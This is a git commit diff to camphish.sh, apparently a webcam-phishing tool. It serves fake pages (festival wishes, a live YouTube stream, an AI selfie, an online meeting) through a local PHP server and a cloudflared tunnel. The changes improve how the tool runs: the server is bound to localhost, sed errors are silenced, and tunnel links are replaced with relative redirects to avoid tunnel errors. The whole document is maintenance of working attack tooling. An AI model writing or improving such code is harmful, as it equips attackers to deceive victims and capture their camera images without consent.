725528b9839aeeaed8957f0803755ab27a04bd79
jesusdorian999019 <ururiandia@gmail.com>
2026-05-11 23:18:41 -0500

    mejora_v3

--- camphish.sh
+++ camphish.sh
@@ -270,7 +270,7 @@ else
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 0.0.0.0:3333 > php_server.log 2>&1 & 
+php -S 127.0.0.1:3333 > php_server.log 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm -rf .cloudflared_output.log > /dev/null 2>&1
@@ -311,17 +311,17 @@ checkfound
 payload_cloudflare() {
 link=$(grep -o 'https://[^ ]*\.trycloudflare.com' ".cloudflared_output.log" | head -n1)
 # Usamos redirección relativa para evitar errores 502/503 del túnel
-sed 's+forwarding_link+index2.html+g' template.php > index.php
+sed 's+forwarding_link+index2.html+g' template.php > index.php 2>/dev/null
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+index2.html+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+index2.html+g' festivalwishes.html > index3.html 2>/dev/null
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+index2.html+g' LiveYTTV.html > index3.html
+sed 's+forwarding_link+index2.html+g' LiveYTTV.html > index3.html 2>/dev/null
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 elif [[ $option_tem -eq 4 ]]; then
-sed 's+forwarding_link+index2.html+g' AISelfie.html > index2.html
+sed 's+forwarding_link+index2.html+g' AISelfie.html > index2.html 2>/dev/null
 else
-sed 's+forwarding_link+index2.html+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+index2.html+g' OnlineMeeting.html > index2.html 2>/dev/null
 fi
 rm -rf index3.html
 }
@@ -474,12 +474,12 @@ if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+index2.html+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+forwarding_link+index2.html+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 elif [[ $option_tem -eq 4 ]]; then
-sed 's+forwarding_link+'$link'+g' AISelfie.html > index2.html
+sed 's+forwarding_link+index2.html+g' AISelfie.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+index2.html+g' OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
 }
